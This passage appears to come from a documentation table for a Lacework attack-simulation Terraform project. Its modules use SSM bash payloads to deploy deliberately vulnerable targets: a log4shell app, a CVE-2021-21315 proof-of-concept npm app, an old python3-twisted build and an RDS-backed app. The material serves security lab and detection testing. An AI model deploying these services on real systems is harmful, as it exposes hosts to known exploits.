&gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &#35; clone the log4shell vulnerable app<br/>    log &quot;cloning https://github&#46;com/christophetd/log4shell&#45;vulnerable&#45;app&#46;&#46;&#46;&quot;<br/>    git clone https://github&#46;com/christophetd/log4shell&#45;vulnerable&#45;app<br/>    cd log4shell&#45;vulnerable&#45;app<br/>    log &quot;running gradle build&#46;&#46;&#46;&quot;<br/>    nohup gradle bootJar &#45;&#45;no&#45;daemon &amp;<br/>    GRADLE&&#35;95;PID=$&#33;<br/>    while kill &#45;0 $GRADLE&&#35;95;PID 2&gt; /dev/null; do<br/>        log &quot;Process is still running&#46;&#46;&#46;&quot;<br/>        sleep 30<br/>    done<br/>    log &quot;gradle build complete&#46;&quot;<br/>    <br/>    ls &#45;ltr build/libs/&&#35;42;&#46;jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &#35; copy java jar<br/>    log &quot;Copying java jar&#46;&#46;&quot;<br/>    cp build/libs/log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;/log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    <br/>    &#35; change to app root dir<br/>    cd $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        if pgrep &#45;f &quot;log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar&quot;; then<br/>            kill &#45;9 $&&#35;40;pgrep &#45;f &quot;log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar&quot;&&#35;41;<br/>        fi<br/>        screen &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/vuln&&#35;95;log4j&&#35;95;app&&#35;95;target&#46;log &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;m java &#45;jar $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;/log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar &#45;&#45;server&#46;port=$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125;<br/>        screen &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl unzip git&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl unzip git&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    web = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/web&#46;py&quot;,<br/>                        &&#35;41;<br/><br/>    ldap = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/ldap&#46;py&quot;,<br/>                        &&#35;41;<br/>    requirements = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;,<br/>                        &&#35;41;<br/>    <br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| attacker-vulnerable-npm-app                                                | ./modules/ssm/deploy-npm-app                                   | ssm_deploy_npm_app                         | context.aws.ssm.vulnerable.npm_app                                        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "npm_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8089<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-npm-app                                   | <pre>locals &&#35;123;<br/>    repo = &quot;https://github&#46;com/ForbiddenProgrammer/CVE&#45;2021&#45;21315&#45;PoC&quot;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;X quit<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;npm&&#35;95;app&&#35;95;target&#46;log<br/>    log &quot;checking for git&#46;&#46;&#46;&quot;<br/>    while &#33; command &#45;v git; do<br/>        log &quot;git not found &#45; waiting&quot;<br/>        sleep 10<br/>    done<br/>    log &quot;git: $&&#35;40;command &#45;v  git&&#35;41;&quot;<br/>    rm &#45;rf /vuln&&#35;95;npm&&#35;95;app&&#35;95;target &amp;&amp; &&#35;92;<br/>    mkdir /vuln&&#35;95;npm&&#35;95;app&&#35;95;target &amp;&amp; &&#35;92;<br/>    cd /vuln&&#35;95;npm&&#35;95;app&&#35;95;target &amp;&amp; &&#35;92;<br/>    git clone $&&#35;123;local&#46;repo&&#35;125; &amp;&amp; &&#35;92;<br/>    cd CVE&#45;2021&#45;21315&#45;PoC &amp;&amp; &&#35;92;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;index&&#35;95;js&&#35;95;base64&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; index&#46;js<br/>    npm install &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/vuln&&#35;95;npm&&#35;95;app&&#35;95;target&#46;log &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;m npm start &#45;&#45;prefix /vuln&&#35;95;npm&&#35;95;app&&#35;95;target/CVE&#45;2021&#45;21315&#45;PoC<br/>        screen &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl nodejs npm&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl nodejs npm&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    index&&#35;95;js&&#35;95;base64 = templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/index&#46;js&quot;,<br/>                &&#35;123;<br/>                    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                &&#35;125;&&#35;41;<br/>    <br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| attacker-vulnerable-python3-twisted-app                                    | ./modules/ssm/deploy-python3-twisted-app                       | ssm_deploy_python3_twisted_app             | context.aws.ssm.vulnerable.python3_twisted_app                            | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "python3_twisted_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8090<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-python3-twisted-app                       | <pre>locals &&#35;123;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;X quit<br/>    screen &#45;wipe<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target&#46;log<br/>    if command &#45;v $PACKAGE&&#35;95;MANAGER &amp;&amp; $PACKAGE&&#35;95;MANAGER list &#124; grep &quot;python3&#45;twisted&quot; &#124; grep &quot;18&#46;9&#46;0&#45;11ubuntu0&#46;20&#46;04&quot;; then<br/>        mkdir &#45;p /vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app<br/>        cd /vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;app&&#35;95;py&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; app&#46;py<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/>        log &quot;installing requirements&#46;&#46;&#46;&quot;<br/>        python3 &#45;m pip install &#45;r requirements&#46;txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;requirements installed&quot;<br/>        <br/>        START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>        while true; do<br/>            log &quot;starting app&quot;<br/>            screen &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;X quit<br/>            screen &#45;wipe<br/>            screen &#45;d &#45;L &#45;Logfile /tmp/vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target&#46;log &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;m python3 /vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app/app&#46;py<br/>            screen &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;X colon &quot;logfile flush 0^M&quot;<br/>            sleep 30<br/>            log &quot;check app url&#46;&#46;&#46;&quot;<br/>            while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>                log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>                sleep 60<br/>            done<br/>            log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>            sleep 1800<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            fi<br/>        done<br/>    else<br/>        log &quot;python twisted vulnerability required the following package installed:&quot;<br/>        log &quot;python3&#45;twisted/focal&#45;updates,focal&#45;security,now 18&#46;9&#46;0&#45;11ubuntu0&#46;20&#46;04&#46;1&quot;<br/>    fi<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl python3&#45;pip&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl python3&#45;pip&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    app&&#35;95;py = templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/app&#46;py&quot;,<br/>                &&#35;123;<br/>                    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                &&#35;125;&&#35;41;<br/>    requirements = templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;,<br/>                &&#35;123;<br/>                &&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| attacker-vulnerable-rds-app                                                | ./modules/ssm/deploy-rds-app                                   | ssm_deploy_rds_app                         | context.aws.ssm.vulnerable.rds_app                                        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "rds_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8091<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-rds-app                                   | <pre>locals &&#35;123;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    app&&#35;95;dirname = &quot;vuln&&#35;95;rdsapp&&#35;95;target&quot;<br/>    app&&#35;95;path = &quot;/$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;/app&#46;py&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;rdsapp&&#35;95;target &#45;X quit<br/>    screen &#45;wipe<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;rdsapp&&#35;95;target&#46;log<br/>    log &quot;removing previous app directory&quot;<br/>    rm &#45;rf /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;<br/>    log &quot;building app directory&quot;<br/>    mkdir &#45;p /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;/templates<br/>    cd /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;<br/>    <br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;app&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; app&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;test&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; test&#46;py<br/>    curl &#45;LOJ https://s3&#46;amazonaws&#46;com/rds&#45;downloads/rds&#45;combined&#45;ca&#45;bundle&#46;pem<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;database&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; bootstrap&#46;sql<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;entrypoint&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; entrypoint&#46;sh<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;index&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; templates/index&#46;html<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;cast&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; templates/cast&#46;html<br/><br/>    log &quot;updating entrypoing permissions&quot;<br/>    chmod 755 entrypoint&#46;sh<br/><br/>    log &quot;installing requirements&#46;&#46;&#46;&quot;<br/>    python3 &#45;m pip install &#45;r requirements&#46;txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    log &quot;requirements installed&quot;<br/>    <br/>    log &quot;running mysql boostrap&#46;&#46;&#46;&quot;<br/>    mysql &#45;&#45;ssl&#45;ca=rds&#45;combined&#45;ca&#45;bundle&#46;pem &#45;&#45;ssl&#45;mode=REQUIRED &#45;h $&&#35;123;split&&#35;40;&quot;:&quot;, var&#46;inputs&&#35;91;&quot;db&&#35;95;host&quot;&&#35;93;&&#35;41;&&#35;91;0&&#35;93;&&#35;125; &#45;u$&&#35;123;var&#46;inputs&&#35;91;&quot;db&&#35;95;user&quot;&&#35;93;&&#35;125; &#45;p$&&#35;123;var&#46;inputs&&#35;91;&quot;db&&#35;95;password&quot;&&#35;93;&&#35;125; &lt; bootstrap&#46;sql<br/>    log &quot;mysql boostrap complete&quot;<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen &#45;S $&&#35;123;local&#46;app&&#35;95;dirname&&#35;125; &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;&#46;log &#45;S $&&#35;123;local&#46;app&&#35;95;dirname&&#35;125; &#45;m /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;/entrypoint&#46;sh<br/>        screen &#45;S $&&#35;123;local&#46;app&&#35;95;dirname&&#35;125; &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125;/cast &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125;/cast &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl python3&#45;pip mysql&#45;client&#45;core&#45;8&#46;0&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl 